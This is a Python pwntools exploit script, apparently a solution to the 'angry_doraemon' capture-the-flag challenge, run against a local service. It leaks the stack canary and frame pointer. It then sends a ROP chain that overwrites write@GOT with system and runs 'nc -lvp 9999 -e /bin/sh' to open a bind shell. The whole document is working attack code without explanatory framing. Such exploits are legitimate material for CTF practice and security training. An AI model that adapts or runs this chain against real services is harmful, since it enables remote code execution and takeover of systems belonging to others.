from pwn import *
from time import sleep

context.log_level = 'debug'

binary = ELF('./angry_doraemon')

write_plt = binary.plt['write']
write_got = binary.got['write']
read_plt = binary.plt['read']
read_got = binary.got['read']
exit_plt = binary.plt['exit']

bss = binary.bss()

cmd = 'nc -lvp 9999 -e /bin/sh'
system_offset = 0x9ad60

binsh = 0x804970d

pppr = 0x08048ea6

execl = 0x8048c62
attack_rop = 0x8049044

r = remote('localhost', 8888) 
r.recv()
log.info('wait for 2 seconds')
sleep(2)
r.recv()
r.sendline('4')
r.recv()
r.sendline('y'*10)
leak = r.recv()
canary_leak = u32(leak.split('y'*10)[1][:4].replace('\x0a', '\x00'))
ebp_leak = u32(leak.split('y'*10)[1][12:16])
log.info('leaked canary: ' + hex(canary_leak))
log.info('leaked ebp: ' + hex(ebp_leak))
r.close()

r = remote('localhost', 8888)
r.recv()
log.info('wait for 2 seconds')
sleep(2)
r.recv()
r.sendline('4')
r.recv()
payload = 'y'*10
payload += p32(canary_leak) + p32(ebp_leak) + 'a'*8
payload += p32(write_plt) + p32(pppr) + p32(4) + p32(read_got) + p32(4)
payload += p32(read_plt) + p32(pppr) + p32(4) + p32(write_got) + p32(4)
payload += p32(read_plt) + p32(pppr) + p32(4) + p32(bss) + p32(len(cmd))
payload += p32(write_plt) + p32(exit_plt) + p32(bss) + p32(0)
r.send(payload)
leak_read_got = u32(r.recv(4))
log.info('leaked read@got: ' + hex(leak_read_got))
r.send(p32(leak_read_got - system_offset))
r.send(cmd)
